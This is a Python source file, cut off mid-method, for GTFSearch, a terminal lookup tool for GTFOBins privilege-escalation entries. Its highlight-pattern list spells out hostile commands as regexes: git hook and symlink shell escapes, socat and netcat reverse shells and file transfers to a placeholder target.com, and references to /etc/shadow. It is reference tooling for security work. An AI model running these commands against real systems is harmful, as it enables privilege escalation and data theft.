#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# 
# Author        : JordanSec aka (SkyW4r33x)
# Repository    : https://github.com/SkyW4r33x/GTFSearch
# Credits       : https://gtfobins.github.io/


import json
import os
import re
import sys
import pwd
import argparse
import logging
from rich import box
from rich.padding import Padding
from pathlib import Path
from rich.console import Console
from rich.table import Table
from prompt_toolkit import PromptSession
from prompt_toolkit.history import FileHistory
from prompt_toolkit.key_binding import KeyBindings
from prompt_toolkit.keys import Keys
from prompt_toolkit.styles import Style
from prompt_toolkit.completion import Completer, Completion
from typing import List, Dict, Iterable, Optional, Tuple
from rich.panel import Panel
from rich.text import Text

# ------------------------ GLOBAL CONFIGURATION ------------------------ #

CONFIG = {
    'MAX_QUERY_LENGTH': 100,
    'MAX_PATH_LENGTH': 255,
    'MAX_DATA_FIELD_LENGTH': 10000,
    'MAX_RESULTS': 100,
    'MAX_COMPLETIONS': 50,
    'PROMPT_STYLE': Style.from_dict({
        'prompt.parens': '#5EBDAB',
        'prompt.name': '#fe013a bold',
        'prompt.dash': '#5EBDAB',
        'prompt.brackets': '#5EBDAB',
        'prompt.success': '#5EBDAB',
        'prompt.error': '#FF0000',
        'prompt.white': '#FFFFFF',
        'input': '#F5F5F5',
        'completion-menu': 'bg:#1a1a1a #474747',
        'completion-menu.completion': 'bg:#1a1a1a #FEA44C',
        'completion-menu.completion.current': 'bg:#347cf1 #FFFFFF bold',
        'scrollbar.background': 'bg:#1a1a1a',
        'scrollbar.button': 'bg:#474747',
    }),
    'HIGHLIGHT_PATTERNS': [
     #  r'\b(/[\w/.-]+)\b',  # paths
        r'\b(nc\s+(?:-\S+\s+)*\d+)\b',  # nc -l -p 12345
        r'\b(nc\s+[\w.]+\s+\d+)\b',  # nc target.com 12345
        r'\b(\$TF/IP/PORT/PATH)\b',  # $TF/IP/PORT/PATH
        r'\b(php -S 0\.0\.0\.0:\d+)\b',  # php -S 0.0.0.0:8080
        r'\b(sh -p)\b',  # sh -p
        r'\b(\s-p\b)\b',  # -p with space before
        r'\b(?<![a-zA-Z])sh(?![a-zA-Z])\b',  # sh not part of larger word
        r'\bsudo\b',  # sudo
        r'\bsystem\(\)',  # system()
        r'\bcheck_memory\b',  # check_memory
        r'\bcheck_raid\b',  # check_raid
        r'\bcheck_log\b',  # check_log
        r'\bcheck_cups\b',  # check_cups
        r'\bcheck_by_ssh\b',  # check_by_ssh
        r'\b2\.4\.5\b',  # 2.4.5
        r'\b(--parents)\b',  # --parents
        r'\bcp\b',  # cp
        r'\b@\b',  # @
        r'\bxx0file_to_write\b',  # xx0file_to_write
        r'\b(-f)\b',  # -f
        r'\bxx\b',  # xx
        r'\bcrontab\b',  # crontab
        r'\b\$LFILE\b',  # $LFILE
        r'\b\$LDIR\b',  # $LDIR
        r'\b\$TF\b',  # $TF
        r'\bdstat\b',  # dstat
        r'\bpython\b',  # python
        r'\b(~/.dstat/)\b',  # ~/.dstat/
        r'\b\((path of binary)/plugins/\)\b',  # (path of binary)/plugins/
        r'\b(/usr/share/dstat/)\b',  # /usr/share/dstat/
        r'\b(/usr/local/share/dstat/)\b',  # /usr/local/share/dstat/
        r'\bdosbox\b',  # dosbox
        r'\bFILE_TO_\b',  # FILE_TO_
        r'\becho\b',  # echo
        r'\b(\\r\\n)\b',  # \r\n
        r'\bcopy\b',  # copy
        r'\bdebian\b',  # debian
        r'\bdocker\b',  # docker
        r'\broot\b',  # root
        r'\b(--dump-bin)\b',  # --dump-bin
        r'\b(--no-sysfs)\b',  # --no-sysfs
        r'\bcpan\b',  # cpan
        r'\b(! command)\b',  # ! command
        r'\bless\b',  # less
        r'\b(HTTP::Server::Simple)\b',  # HTTP::Server::Simple
        r'\b(nc -lvp RPORT)\b',  # nc -lvp RPORT
        r'\bPWD\b',  # PWD
        r'\bperl\b',  # perl
        r'\bsed\b',  # sed
        r'\b6\b',  # 6
        r'\bcheck_statusfile\b',  # check_statusfile
        r'\b(socat file:`tty`,raw,echo=0 tcp-listen:12345)\b',  # socat file:`tty`,raw,echo=0 tcp-listen:12345
        r'\btex\b',  # tex
        r'\btexput\.dvi\b',  # texput.dvi
        r'\bfmt\b',  # fmt
        r'\b(base64 "file_to_send" \| sudo nc -l -p 79)\b',  # base64 "file_to_send" | sudo nc -l -p 79
        r'\b(sudo nc -l -p 79 \| base64 -d > "file_to_save")\b',  # sudo nc -l -p 79 | base64 -d > "file_to_save"
        r'\bexpect\b',  # expect
        r'\b(--count)\b',  # --count
        r'\b(<testbinary path="DATA">)\b',  # <testbinary path="DATA">
        r'\bpre-commit\b',  # pre-commit
        r'\b(-C)\b',  # -C
        r'\bgit\b',  # git
        r'\b(git branch)\b',  # git branch
        r'\b(git diff /dev/null /path/to/file >x\.patch)\b',  # git diff /dev/null /path/to/file >x.patch
        r'\b(ctrl-c)\b',  # ctrl-c
        r'\bruby\b',  # ruby
        r'\brdoc\b',  # rdoc
        r'\bvi\b',  # vi
        r'\bCAP_SETUID\b',  # CAP_SETUID
        r'\b(core\.\$PID)\b',  # core.$PID
        r'\bstrings\b',  # strings
        r'\bkickstart\b',  # kickstart
        r'\blibcap\b',  # libcap
        r'\bping\b',  # ping
        r'\b(`ldconfig`)\b',  # `ldconfig`
        r'\b(mktemp -d)\b',  # mktemp -d
        r'\b(git init "\$TF")\b',  # git init "$TF"
        r'\b(echo \'exec /bin/sh 0<&2 1>&2\' > "\$TF/\.git/hooks/pre-commit\.sample")\b',  # echo 'exec /bin/sh 0<&2 1>&2' > "$TF/.git/hooks/pre-commit.sample"
        r'\b(mv "\$TF/\.git/hooks/pre-commit\.sample" "\$TF/\.git/hooks/pre-commit")\b',  # mv "$TF/.git/hooks/pre-commit.sample" "$TF/.git/hooks/pre-commit"
        r'\b(git -C "\$TF" commit --allow-empty -m x)\b',  # git -C "$TF" commit --allow-empty -m x
        r'\b(ln -s /bin/sh "\$TF/git-x")\b',  # ln -s /bin/sh "$TF/git-x"
        r'\b(git "--exec-path=\$TF" x)\b',  # git "--exec-path=$TF" x
        r'\b(find / -fprintf "\$FILE" DATA -quit)\b',  # find / -fprintf "$FILE" DATA -quit
        r'\b(\.git/hooks/pre-commit)\b',  # .git/hooks/pre-commit
        r'\b(exec /bin/sh 0<&2 1>&2)\b',  # exec /bin/sh 0<&2 1>&2
        r'\b(--allow-empty)\b',  # --allow-empty
        r'\b(-m x)\b',  # -m x
        r'\b(ln -s /bin/sh)\b',  # ln -s /bin/sh
        r'\b(--exec-path)\b',  # --exec-path
        r'\b(-fprintf)\b',  # -fprintf
        r'\b(-quit)\b',  # -quit
        r'\bDATA\b',  # DATA
        r'\bLFILE\b',  # LFILE
        r'\b\$LPORT\b',  # $LPORT
        r'\b\$RPORT\b',  # $RPORT
        r'\b\$RHOST\b',  # $RHOST
        r'\b\$LHOST\b',  # $LHOST
        r'\b\$FILE_TO_READ\b',  # $FILE_TO_READ
        r'\b\$FILE_TO_WRITE\b',  # $FILE_TO_WRITE
        r'\b\$FILE_TO_SEND\b',  # $FILE_TO_SEND
        r'\b\$FILE_TO_SAVE\b',  # $FILE_TO_SAVE
        r'\b\$LIB\b',  # $LIB
        r'\b\$COMMAND\b',  # $COMMAND
        r'\b\$SHELL\b',  # $SHELL
        r'\b\$PORT\b',  # $PORT
        r'\b\$IP\b',  # $IP
        r'\b\$CODE\b',  # $CODE
        r'\b/bin/sh\b',  # /bin/sh
        r'\bbash\b',  # bash
        r'\b\!sh\b',  # !sh
        r'\b:q\b',  # :q
        r'\b:w\b',  # :w
        r'\b:r\b',  # :r
        r'\bq!\b',  # q!
        r'\b(-e)\b',  # -e
        r'\b(-i)\b',  # -i
        r'\b(-c)\b',  # -c
        r'\b(-S)\b',  # -S
        r'\b(--shell)\b',  # --shell
        r'\b(--command)\b',  # --command
        r'\b(-l)\b',  # -l
        r'\b(-v)\b',  # -v
        r'\b(-n)\b',  # -n
        r'\b(-u)\b',  # -u
        r'\b(nc .* \$RHOST \$RPORT)\b',  # nc ... $RHOST $RPORT
        r'\b(socat TCP-LISTEN:\d+)\b',  # socat TCP-LISTEN:1234
        r'\b(socat TCP:\$RHOST:\$RPORT)\b',  # socat TCP:$RHOST:$RPORT
        r'\bfile_to_read\b',  # file_to_read
        r'\bfile_to_write\b',  # file_to_write
        r'\bless\b',  # less
        r'\blftp\b',  # lftp
        r'\blinks\b',  # links
        r'\bln\b',  # ln
        r'\bloginctl\b',  # loginctl
        r'\blogsave\b',  # logsave
        r'\blook\b',  # look
        r'\blp\b',  # lp
        r'\bltrace\b',  # ltrace
        r'\blua\b',  # lua
        r'\blualatex\b',  # lualatex
        r'\bluatex\b',  # luatex
        r'\blwp-download\b',  # lwp-download
        r'\blwp-request\b',  # lwp-request
        r'\bmail\b',  # mail
        r'\bmake\b',  # make
        r'\bman\b',  # man
        r'\bmawk\b',  # mawk
        r'\bminicom\b',  # minicom
        r'\bmore\b',  # more
        r'\bmosquitto\b',  # mosquitto
        r'\bmount\b',  # mount
        r'\bmsfconsole\b',  # msfconsole
        r'\bmsgattrib\b',  # msgattrib
        r'\bmsgcat\b',  # msgcat
        r'\bmsgconv\b',  # msgconv
        r'\bmsgfilter\b',  # msgfilter
        r'\bmsgmerge\b',  # msgmerge
        r'\bmsguniq\b',  # msguniq
        r'\bmtr\b',  # mtr
        r'\bmultitime\b',  # multitime
        r'\bmv\b',  # mv
        r'\bmysql\b',  # mysql
        r'\bnano\b',  # nano
        r'\bnasm\b',  # nasm
        r'\bnawk\b',  # nawk
        r'\bnc\b',  # nc
        r'\bncdu\b',  # ncdu
        r'\bncftp\b',  # ncftp
        r'\bneofetch\b',  # neofetch
        r'\bnft\b',  # nft
        r'\bnice\b',  # nice
        r'\bnl\b',  # nl
        r'\bnm\b',  # nm
        r'\bnmap\b',  # nmap
        r'\bnode\b',  # node
        r'\bnohup\b',  # nohup
        r'\bnpm\b',  # npm
        r'\bnroff\b',  # nroff
        r'\bnsenter\b',  # nsenter
        r'\bntpdate\b',  # ntpdate
        r'\boctave\b',  # octave
        r'\bod\b',  # od
        r'\bopenssl\b',  # openssl
        r'\bopenvpn\b',  # openvpn
        r'\bopenvt\b',  # openvt
        r'\bopkg\b',  # opkg
        r'\bpandoc\b',  # pandoc
        r'\bpaste\b',  # paste
        r'\bpax\b',  # pax
        r'\bpdb\b',  # pdb
        r'\bpdflatex\b',  # pdflatex
        r'\bpdftex\b',  # pdftex
        r'\bperf\b',  # perf
        r'\bperl\b',  # perl
        r'\bperlbug\b',  # perlbug
        r'\bpexec\b',  # pexec
        r'\bpg\b',  # pg
        r'\bphp\b',  # php
        r'\bpic\b',  # pic
        r'\bpico\b',  # pico
        r'\bpidstat\b',  # pidstat
        r'\bpip\b',  # pip
        r'\bpkexec\b',  # pkexec
        r'\bpkg\b',  # pkg
        r'\bposh\b',  # posh
        r'\bpr\b',  # pr
        r'\bpry\b',  # pry
        r'\bpsftp\b',  # psftp
        r'\bpsql\b',  # psql
        r'\bptx\b',  # ptx
        r'\bpuppet\b',  # puppet
        r'\bpwsh\b',  # pwsh
        r'\bpython\b',  # python
        r'\brake\b',  # rake
        r'\brc\b',  # rc
        r'\breadelf\b',  # readelf
        r'\bred\b',  # red
        r'\bredcarpet\b',  # redcarpet
        r'\bredis\b',  # redis
        r'\brestic\b',  # restic
        r'\brev\b',  # rev
        r'\brlogin\b',  # rlogin
        r'\brlwrap\b',  # rlwrap
        r'\brpm\b',  # rpm
        r'\brpmdb\b',  # rpmdb
        r'\brpmquery\b',  # rpmquery
        r'\brpmverify\b',  # rpmverify
        r'\brsync\b',  # rsync
        r'\brtorrent\b',  # rtorrent
        r'\bruby\b',  # ruby
        r'\brun-mailcap\b',  # run-mailcap
        r'\brun-parts\b',  # run-parts
        r'\brunscript\b',  # runscript
        r'\brview\b',  # rview
        r'\brvim\b',  # rvim
        r'\bsash\b',  # sash
        r'\bscanmem\b',  # scanmem
        r'\bscp\b',  # scp
        r'\bscreen\b',  # screen
        r'\bscript\b',  # script
        r'\bscrot\b',  # scrot
        r'\bsed\b',  # sed
        r'\bservice\b',  # service
        r'\bsetarch\b',  # setarch
        r'\bsetfacl\b',  # setfacl
        r'\bsetlock\b',  # setlock
        r'\bsftp\b',  # sftp
        r'\bsg\b',  # sg
        r'\bshuf\b',  # shuf
        r'\bslsh\b',  # slsh
        r'\bsmbclient\b',  # smbclient
        r'\bsnap\b',  # snap
        r'\bsocat\b',  # socat
        r'\bsocket\b',  # socket
        r'\bsoelim\b',  # soelim
        r'\bsoftlimit\b',  # softlimit
        r'\bsort\b',  # sort
        r'\bsplit\b',  # split
        r'\bsqlite3\b',  # sqlite3
        r'\bsqlmap\b',  # sqlmap
        r'\bss\b',  # ss
        r'\bssh\b',  # ssh
        r'\bssh-agent\b',  # ssh-agent
        r'\bssh-keygen\b',  # ssh-keygen
        r'\bssh-keyscan\b',  # ssh-keyscan
        r'\bsshpass\b',  # sshpass
        r'\bstart-stop-daemon\b',  # start-stop-daemon
        r'\bstdbuf\b',  # stdbuf
        r'\bstrace\b',  # strace
        r'\bstrings\b',  # strings
        r'\bsu\b',  # su
        r'\bsudo\b',  # sudo
        r'\bsysctl\b',  # sysctl
        r'\bsystemctl\b',  # systemctl
        r'\bsystemd-resolve\b',  # systemd-resolve
        r'\btac\b',  # tac
        r'\btail\b',  # tail
        r'\btar\b',  # tar
        r'\btask\b',  # task
        r'\btaskset\b',  # taskset
        r'\btasksh\b',  # tasksh
        r'\btbl\b',  # tbl
        r'\btclsh\b',  # tclsh
        r'\btcpdump\b',  # tcpdump
        r'\btdbtool\b',  # tdbtool
        r'\btee\b',  # tee
        r'\btelnet\b',  # telnet
        r'\bterraform\b',  # terraform
        r'\btex\b',  # tex
        r'\btftp\b',  # tftp
        r'\btic\b',  # tic
        r'\btime\b',  # time
        r'\btimedatectl\b',  # timedatectl
        r'\btimeout\b',  # timeout
        r'\btmate\b',  # tmate
        r'\btmux\b',  # tmux
        r'\btop\b',  # top
        r'\btorify\b',  # torify
        r'\btorsocks\b',  # torsocks
        r'\btroff\b',  # troff
        r'\btshark\b',  # tshark
        r'\bul\b',  # ul
        r'\bunexpand\b',  # unexpand
        r'\buniq\b',  # uniq
        r'\bunshare\b',  # unshare
        r'\bunsquashfs\b',  # unsquashfs
        r'\bunzip\b',  # unzip
        r'\bupdate-alternatives\b',  # update-alternatives
        r'\buudecode\b',  # uudecode
        r'\buuencode\b',  # uuencode
        r'\bvagrant\b',  # vagrant
        r'\bvalgrind\b',  # valgrind
        r'\bvarnishncsa\b',  # varnishncsa
        r'\bvi\b',  # vi
        r'\bview\b',  # view
        r'\bvigr\b',  # vigr
        r'\bvim\b',  # vim
        r'\bvimdiff\b',  # vimdiff
        r'\bvipw\b',  # vipw
        r'\bvirsh\b',  # virsh
        r'\bvolatility\b',  # volatility
        r'\bw3m\b',  # w3m
        r'\bwall\b',  # wall
        r'\bwatch\b',  # watch
        r'\bwc\b',  # wc
        r'\bwget\b',  # wget
        r'\bwhiptail\b',  # whiptail
        r'\bwhois\b',  # whois
        r'\bwireshark\b',  # wireshark
        r'\bwish\b',  # wish
        r'\bxargs\b',  # xargs
        r'\bxdg-user-dir\b',  # xdg-user-dir
        r'\bxdotool\b',  # xdotool
        r'\bxelatex\b',  # xelatex
        r'\bxetex\b',  # xetex
        r'\bxmodmap\b',  # xmodmap
        r'\bxmore\b',  # xmore
        r'\bxpad\b',  # xpad
        r'\bxxd\b',  # xxd
        r'\bxz\b',  # xz
        r'\byarn\b',  # yarn
        r'\byash\b',  # yash
        r'\byelp\b',  # yelp
        r'\byum\b',  # yum
        r'\bzathura\b',  # zathura
        r'\bzip\b',  # zip
        r'\bzsh\b',  # zsh
        r'\bzsoelim\b',  # zsoelim
        r'\bzypper\b',  # zypper
        r'\b(Ctrl-A o)\b',  # Ctrl-A o
        r'\be\b',  # e
        r'\bEnter\b',  # Enter
        r'\b(Ctrl-A k)\b',  # Ctrl-A k
        r'\b(Ctrl-A x)\b',  # Ctrl-A x
        r'\b(lpadmin -p printer -v socket://localhost -E)\b',  # lpadmin -p printer -v socket://localhost -E
        r'\bcups\b',  # cups
        r'\b(lpadmin -d printer)\b',  # lpadmin -d printer
        r'\b(cupsctl --remote-any)\b',  # cupsctl --remote-any
        r'\b(nc -lkp 9100)\b',  # nc -lkp 9100
        r'\b(ltrace -F DATA)\b',  # ltrace -F DATA
        r'\blua-socket\b',  # lua-socket
        r'\bgroff\b',  # groff
        r'\bEsc\b',  # Esc
        r'\bkill\b',  # kill
        r'\b\.properties\b',  # .properties
        r'\b/path/to/lib\.so\b',  # /path/to/lib.so
        r'\bSPELL\b',  # SPELL
        r'\b-s\b',  # -s
        r'\b(nc target.com 12345 < "file_to_send")\b',  # nc target.com 12345 < "file_to_send"
        r'\bpreinstall\b',  # preinstall
        r'\b(npm -C \$TF run preinstall)\b',  # npm -C $TF run preinstall
        r'\bfpm\b',  # fpm
        r'\bdiff\b',  # diff
        r'\brest-server\b',  # rest-server
        r'\brlogin\b',  # rlogin
        r'\bssh\b',  # ssh
        r'\brsh-client\b',  # rsh-client
        r':py3',  # :py3
        r'\blua-socket\b',  # lua-socket
        r'\b\\n\b',  # \n
        r'\b\\r\\n\b',  # \r\n
        r'\b(system\(\))\b',  # system()
        r'\bImpacket\b',  # Impacket
        r'\b(socat file:`tty`,raw,echo=0 tcp-listen:12345)\b',  # socat file:`tty`,raw,echo=0 tcp-listen:12345
        r'\b(socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat)\b',  # socat -u tcp-listen:12345,reuseaddr open:file_to_save,creat
        r'\b(socat -u file:file_to_send tcp-listen:12345,reuseaddr)\b',  # socat -u file:file_to_send tcp-listen:12345,reuseaddr
        r'\b(socat file:`tty`,raw,echo=0 tcp-listen:12345)\b',  # socat file:`tty`,raw,echo=0 tcp-listen:12345
        r'\b(socat FILE:`tty`,raw,echo=0 TCP:target.com:12345)\b' # socat FILE:`tty`,raw,echo=0 TCP:target.com:12345
        r'\bxaa\b',  # xaa
        r'\bxaa\.xxx\b',  # xaa.xxx
        r'\b-b\b',  # -b
        r'\b(strace - DATA\.)\b',  # strace - DATA.
        r'\brmt\b',  # rmt
        r'\bpostrotate-command\b',  # postrotate-command 
        r'/usr/bin/time\b',  # /usr/bin/time
        r'/etc/passwd\b', # /etc/passwd
        r'/etc/group\b', # /etc/group
        r'/etc/shadow\b', # /etc/shadow
        r'/etc/gshadow\b', # /etc/gshadow
        r'/bin/echo\b',
        r'\bman -l\b', # man -l  
        r"\$'\\b_'",  # $'\b_'
        r'\b(unsquashfs)\b',
        r'\b(nc target.com 12345 > "file_to_send")',  # nc target.com 12345 > "file_to_send"
        r'\b(nc target.com 12345 < "file_to_send")',  # nc target.com 12345 < "file_to_send"
        r'\b(nc -l -p 12345 > "file_to_save")', # nc -l -p 12345 > "file_to_save"
        r'\b(nc -l -p 12345 < "file_to_send")', # nc -l -p 12345 < "file_to_send"
        r'\bpool-create-as\b',# pool-create-as
        r'\blibvirt\b', # libvirt
        r'(--build)', # --build
        r'\bvolshell\b',# volshell
        r'\bstdout\b', # stdout
        r'\bstderr\b', # stderr
        r'(-x)\b', # -x
        r'\\x00\b',  # \x00
        r"\$\'\\n\'",  # $'\n'
        r'(--post-data)\b', # --post-data
        r'(nc -l -p \d+\s*\|\s*tr -d \$\'\\x0d\'\s*\|\s*base64 -d\s*> "[^"]+")',  # nc -l -p 12345 | tr -d $'\x0d' | base64 -d > "file_to_save"
        r"\$\'\\x0d\\x0a\'",  # $'\x0d\x0a'
        r"\$\'\\x0d\'",  # $'\x0d'
        r'\b(base64 "[^"]+" \| nc -l -p \d+)\b',  # base64 "file_to_send" | nc -l -p 12345
        r'\b(yarn --cwd \$TF run preinstall)\b',  # yarn --cwd $TF run preinstall
        r'/var/tmp\b',  # /var/tmp
        r'/var/tmp/yum-root-cR0O4h/',  # /var/tmp/yum-root-cR0O4h/
        r'.rpm\b',  # .rpm
        r'(/usr/lib/zypper/commands/zypper-x)\b', # /usr/lib/zypper/commands/zypper-x
        r'(/bin/sh)\b', # /bin/sh
        r'(sl)\b', # sl
        r'(aaaaaaaaaaaaaaaa)\b', # aaaaaaaaaaaaaaaa
        r'(--allow-overwrite)\b', # --allow-overwrite
        r'\b - \b', # -
        r'\b # \b', # 
        r'(-c)\b', # -c
        r'(-c -#)',  # -c -#
        r'(--paging always)\b',  # --paging always
        r'(busybox --list-full)\b',  # busybox --list-full
        r'\bbzip2\b',  # bzip2
        r'\bbzless\b',  # bzless
        r'\bbzcat\b',  # bzcat
        r'\bbunzip2\b',  # bunzip2
        r'(/usr/lib/nagios/plugins/)',  # /usr/lib/nagios/plugins/
        r'(column)\b', # column
        r'\b(date)\b', # date
        r'\b(dig)\b', # dig
        r'\b(DiG)\b', # DiG
        r'~/.dstat/',  # ~/.dstat/
        r'\(path of binary\)/plugins/',  # (path of binary)/plugins/
        r'/usr/share/dstat/',  # /usr/share/dstat/
        r'/usr/local/share/dstat/',  # /usr/local/share/dstat/
        r'\b(journalctl)\b', # journalctl
        r'\b(finger)\b', # finger
        r'\b(7z)\b', # 7z
        r'\begrep\b',  # egrep
        r'\bfgrep\b',  # fgrep
        r'\bzgrep\b',  # zgrep
        r'\bgrep\b',  # grep
        r'\bzless\b',  # zless
        r'\bzcat\b',   # zcat
        r'\bgunzip\b', # gunzip
        r'\bgzip\b',   # gzip
        r'\b8859_1\b', # 8859_1
        r'\biftop\b', # iftop
        r'\b -i \b', # -i
        r'\bld.so\b', # ld.so
    ],
    'NO_COLOR_PATTERNS': [
        r'Input echo is disable',  # Input echo disabled message 
        r'UID copy of',  # UID copy pattern
        r'\(e\.g\.,',  # e.g. 
        r'e\.g\.,', # e.g.,
        r'(`socat -v tcp-listen:8080)\b', # socat -v tcp-listen:8080
        r'fork - on',  # Pattern for " - on "
    ],
    'HIGHLIGHT_STYLE': 'bold #f74949 on #3a0000',
    'DANGEROUS_PATTERNS': [
        r'[;&|`$(){}[\]<>]',
        r'\.\./',
        r'\\x[0-9a-fA-F]{2}',
        r'eval\s*\(',
        r'exec\s*\(',
        r'import\s+',
        r'__[a-zA-Z_]+__',
        r'subprocess',
        r'os\.',
        r'sys\.',
        r'open\s*\(',
        r'file\s*\(',
        r'input\s*\(',
        r'raw_input\s*\(',
        r'__import__', 
        r'globals\(\)', r'locals\(\)', 
        r'pickle\.loads',  
    ],
}

# ------------------------ LOGGING CONFIGURATION ------------------------ #

logging.basicConfig(level=logging.INFO, format='[%(levelname)s] %(message)s')
logger = logging.getLogger(__name__)

# ------------------------ SECURITY VALIDATION CLASS ------------------------ #

class SecurityValidator:
    @staticmethod
    def sanitize_input(user_input: str) -> str:
        if not isinstance(user_input, str):
            return ""
        sanitized = ''.join(char for char in user_input if char.isprintable() or char == '\n')
        sanitized = sanitized[:CONFIG['MAX_QUERY_LENGTH']]
        sanitized = re.sub(r'\s+', ' ', sanitized).strip()
        return sanitized

    @staticmethod
    def validate_query(query: str) -> Tuple[bool, str]:
        if not query:
            return False, "Empty query"
        if len(query) > CONFIG['MAX_QUERY_LENGTH']:
            return False, f"Query too long (max {CONFIG['MAX_QUERY_LENGTH']})"
        for pattern in CONFIG['DANGEROUS_PATTERNS']:
            if re.search(pattern, query, re.IGNORECASE):
                return False, f"Disallowed pattern: {pattern}"
        if not re.match(r'^[a-zA-Z0-9\s\-_]+$', query):
            return False, "Invalid characters"
        return True, "Valid"

    @staticmethod
    def validate_file_path(file_path: str) -> Tuple[bool, str]:
        try:
            path = Path(file_path).resolve(strict=True)
            allowed_dirs = [Path.home().resolve()]
            if 'SUDO_USER' in os.environ:
                original_user = os.environ['SUDO_USER']
                user_info = pwd.getpwnam(original_user)
                allowed_dirs.append(Path(user_info.pw_dir).resolve())
            if not any(str(path).startswith(str(d)) for d in allowed_dirs):
                return False, "Access denied: outside allowed dirs"
            if len(str(path)) > CONFIG['MAX_PATH_LENGTH'] or '..' in path.parts:
                return False, "Invalid path"
            return True, "Valid"
        except (OSError, ValueError) as e:
            return False, f"Path error: {str(e)}"

# ------------------------ SECURE FILE HANDLING CLASS ------------------------ #
class SecureFileHandler:
    @staticmethod
    def safe_read_json(file_path: str) -> Tuple[bool, Optional[List[Dict]], str]:
        is_valid, msg = SecurityValidator.validate_file_path(file_path)
        if not is_valid:
            return False, None, msg
        try:
            if not os.access(file_path, os.R_OK) or os.path.getsize(file_path) > 50 * 1024 * 1024:
                return False, None, "Access denied or file too large"
            with open(file_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            return True, data, "Success"
        except Exception as e:
            logger.error(f"JSON load error: {str(e)}")
            return False, None, str(e)

# ------------------------ SECURE AUTOCOMPLETE CLASS ------------------------ #

class SecureCustomCompleter(Completer):
    def __init__(self, command_pairs: List[tuple], binaries: List[str]):
        self.command_pairs = command_pairs
        self.binaries = [binary for binary in binaries if binary]
        self.all_completions = [f"[{alias}] {cmd}" for alias, cmd in command_pairs] + self.binaries

    def get_completions(self, document, complete_event) -> Iterable[Completion]:
        text = document.text_before_cursor.lower()
        
        completion_count = 0
        max_completions = CONFIG['MAX_COMPLETIONS']
        
        for alias, cmd in self.command_pairs:
            if completion_count >= max_completions:
                break
            
            display_text = f"[{alias}] {cmd}"
            if text in alias.lower() or text in cmd.lower() or text in display_text.lower():
                yield Completion(
                    display_text,
                    start_position=-len(document.text_before_cursor),
                    style="bg:#1a1a1a #FFFFFF"
                )
                completion_count += 1
        
        for binary in self.binaries:
            if completion_count >= max_completions:
                break
            
            if text in binary.lower():
                yield Completion(
                    binary,
                    start_position=-len(document.text_before_cursor),
                    style="bg:#1a1a1a #FEA44C"
                )
                completion_count += 1

# ------------------------ CONFIG CLASS ------------------------ #

class Config:
    @staticmethod
    def get_real_user() -> str:
        return os.getenv("SUDO_USER") or os.getenv("USER") or "unknown"
    
    real_user = get_real_user()
    data_file: Path = Path(f"/home/{real_user}/.data/gtfobins.json")

# ------------------------ DATA LOADER CLASS ------------------------ #

class DataLoader:
    _cache: Optional[List[Dict]] = None

    @classmethod
    def load_gtfobins(cls, file_path: str) -> List[Dict]:
        if cls._cache is not None:
            return cls._cache
        success, data, msg = SecureFileHandler.safe_read_json(file_path)
        if not success:
            logger.error(msg)
            alternative_paths = [
                Path.home() / '.data' / 'gtfobins.json',
                Path('/usr/share/gtfobins/gtfobins.json'),
                Path('./gtfobins.json'),
            ]
            for alt in alternative_paths:
                if alt.exists() and str(alt) != file_path:
                    logger.info(f"Trying alternative path: {alt}")
                    success, data, msg = SecureFileHandler.safe_read_json(str(alt))
                    if success:
                        break
            if not success:
                return []
        if not isinstance(data, list):
            logger.error("Invalid data format")
            return []
        validated_data = []
        for item in data:
            if not isinstance(item, dict) or 'name' not in item or 'functions' not in item:
                continue
            name = str(item.get('name', '')).strip()[:CONFIG['MAX_DATA_FIELD_LENGTH']]
            if not name or not re.match(r'^[a-zA-Z0-9\-_.+]+$', name):
                continue
            validated_item = {'name': name, 'functions': []}
            for func in item.get('functions', []):
                if not isinstance(func, dict):
                    continue
                validated_func = {}
                for k in ['function', 'description', 'functions']: 
                    if k in func:
                        key = 'function' if k == 'functions' else k
                        validated_func[key] = str(func[k]).strip()[:CONFIG['MAX_DATA_FIELD_LENGTH']]
                if 'examples' in func and isinstance(func['examples'], list):
                    examples = []
                    for ex in func['examples']:
                        if isinstance(ex, dict):
                            val_ex = {}
                            for k, v in ex.items():
                                if k in ['code', 'description', 'sub_description', 'su_description']:
                                    value = str(v).strip()[:CONFIG['MAX_DATA_FIELD_LENGTH']]
                                    if k in ['sub_description', 'su_description']:                
                                        value = re.sub(r'\(\s*[a-zA-Z]\s*\)', '', value).strip()
                                    val_ex[k] = value
                            if val_ex:
                                examples.append(val_ex)
                    if examples:
                        validated_func['examples'] = examples
                if validated_func:
                    validated_item['functions'].append(validated_func)
            if validated_item['functions']:
                validated_data.append(validated_item)
        cls._cache = validated_data
        return validated_data

# ------------------------ MAIN GTFSEARCH CLASS ------------------------ #

class GTFSearch:
    def __init__(self, function_filter: Optional[str] = None, from_search_command: bool = False):
        self.console = Console()
        self.function_filter = function_filter.lower() if function_filter else None
        
        self.gtfobins_file = str(Config.data_file)
        
        self.gtfobins_data = DataLoader.load_gtfobins(self.gtfobins_file)
        self.gtfobins_index = {tool['name'].lower(): tool for tool in self.gtfobins_data if 'name' in tool}
        
        self.last_command_success = True
        self.from_search_command = from_search_command
        
        self.prompt_session = self._init_secure_prompt_session()

    def _init_secure_prompt_session(self) -> PromptSession:
        kb = KeyBindings()
        
        @kb.add(Keys.ControlC)
        def _(event):
            self._clear_screen_only() 
            self.console.print("\n\n[bold #FF8A18][!] [/bold #FF8A18]To exit properly, use the command [bold red]q[/bold red] or [bold red]exit[/bold red].\n") 
            event.app.renderer.reset()
            event.app.invalidate()

        @kb.add(Keys.ControlL)
        def _(event):
            self._clear_screen()
            self.last_command_success = True
            event.app.renderer.reset()
            event.app.invalidate()

        @kb.add(Keys.ControlK)
        def _(event):
            self._clear_screen_only()
            self._list_commands()
            self.last_command_success = True
            event.app.renderer.reset()
            event.app.invalidate()

        def get_prompt():
            return [
                ('class:prompt.parens', '('),
                ('class:prompt.name', 'GTFsearch'),
                ('class:prompt.parens', ')'),
                ('class:prompt.dash', '-'),
                ('class:prompt.brackets', '['),
                ('class:prompt.success' if self.last_command_success else 'class:prompt.error', '✔' if self.last_command_success else '✘'),
                ('class:prompt.brackets', ']'),
                ('class:prompt.white', ' > '),
            ]

        command_pairs = [
            ('help', 'h'),
            ('list binaries', 'lt'),
            ('exit', 'q'),
        ]
        
        binaries = sorted({tool.get('name', '') for tool in self.gtfobins_data if tool.get('name')})
        completer = SecureCustomCompleter(command_pairs, binaries)
        
